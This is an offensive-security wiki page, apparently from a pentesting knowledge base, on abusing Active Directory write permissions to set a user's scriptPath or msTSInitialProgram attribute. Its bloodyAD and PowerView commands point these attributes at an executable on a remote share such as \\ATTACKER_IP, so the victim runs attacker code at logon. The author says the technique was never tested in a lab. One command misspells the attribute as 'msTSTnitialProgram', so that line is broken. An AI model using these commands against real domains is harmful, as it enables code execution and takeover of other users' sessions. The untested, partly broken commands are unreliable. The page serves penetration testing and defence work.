---
authors: CravateRouge, ShutdownRepo
category: ad
---

# Logon script

> [!NOTE]
> It is worth noting that during lab testing, I couldn't find a way to practice this scenario. Since I didn't find practical enough resources on the Internet, feel free to reach out if you manage to exploit this.

This abuse can be carried out when controlling an object that has a `GenericAll` or `GenericWrite` over the target, or a `WriteProperty` premission over the target's logon script attribute (i.e. `scriptPath` or `msTSInitialProgram`).

The attacker can make the user execute a custom script at logon.

::: tabs


=== UNIX-like

This can be achieved with [bloodyAD](https://github.com/CravateRouge/bloodyAD).
```bash
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object vulnerable_user msTSInitialProgram -v '\\1.2.3.4\share\file.exe'
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object vulnerable_user msTSWorkDirectory -v 'C:\'

# or
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object vulnerable_user scriptPath -v '\\1.2.3.4\share\file.exe'
```


=== Windows

This can be achieved with [Set-DomainObject](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainObject/) ([PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1) module).

```bash

Set-DomainObject testuser -Set @{'msTSTnitialProgram'='\\ATTACKER_IP\share\run_at_logon.exe'} -Verbose

Set-DomainObject testuser -Set @{'scriptPath'='\\ATTACKER_IP\share\run_at_logon.exe'} -Verbose
```


:::